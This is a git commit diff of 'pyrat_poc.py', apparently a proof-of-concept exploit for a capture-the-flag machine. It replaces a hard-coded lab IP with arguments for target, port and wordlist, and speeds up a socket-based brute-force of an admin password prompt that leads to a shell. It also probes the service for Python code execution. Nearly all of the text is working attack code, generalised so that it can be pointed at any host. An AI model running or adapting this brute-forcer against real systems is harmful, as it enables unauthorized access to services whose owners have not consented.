d003a18654eb177287cc4e0a90726be33d30b21e
Th3_F0x <88468003+PearceA102@users.noreply.github.com>
2024-10-13 18:13:04 -0700

    Update pyrat_poc.py
    Script is now fully functional, due to the server itself updated correct password with line to go with it. Also added modular arguments for target, port, and wordlist to limit modification.

--- pyrat_poc.py
+++ pyrat_poc.py
@@ -8,29 +8,31 @@ import os
 
 
 def main():
-	if len(sys.argv) != 2:
-		print('Usage: [X] <exploit.py> <pathToWordlist>')
+	if len(sys.argv) != 4:
+		print('Usage: [X] <exploit.py> <target> <port> <pathToWordlist>')
 		sys.exit(0)
 
 main()
+target = sys.argv[1]
+port = sys.argv[2]
+port = int(port)
 	
+
 def brute():
 	try:
 		timer = 0
 		s = socket.socket()
-		s.connect(('10.10.231.176', 8000))
+		s.connect((target, port))
 		s.send(b'admin')
-		wordlist = open(sys.argv[1], 'r')
+		wordlist = open(sys.argv[3], 'r')
 		for word in wordlist:
 			timer = timer + 1
 			word = word.strip()
-			time.sleep(1)
-			print('Trying:', word)
-			response = s.recv(1024).decode()
-			print(response)
+			time.sleep(0.050)
+			print('Trying: {} on line {}'.format(word,timer))
 			s.send(word.encode())
-			if 'Welcome Admin!!! Type "shell" to begin' in response:
-				print(word, timer)
+			if 'Welcome Admin!!! Type "shell" to begin' in s.recv(1024).decode():
+				print('Potential password found! Try password on line {}'.format(timer - 1))
 				break
 			elif (timer % 3 == 0):
 				s.send(b'admin')
@@ -42,7 +44,7 @@ def brute():
 
 try:
 	s = socket.socket()
-	s.connect(('10.10.231.176', 8000))
+	s.connect((target, port))
 	s.send(b'test')
 	if "'test' is not defined" in s.recv(1024).decode():
 		for w in 'Connection Successful. Attempt exploit? Y/n\n\r':
@@ -64,6 +66,5 @@ try:
 		print('\n')
 except socket.error as error:
 	print(error)
-
 
 
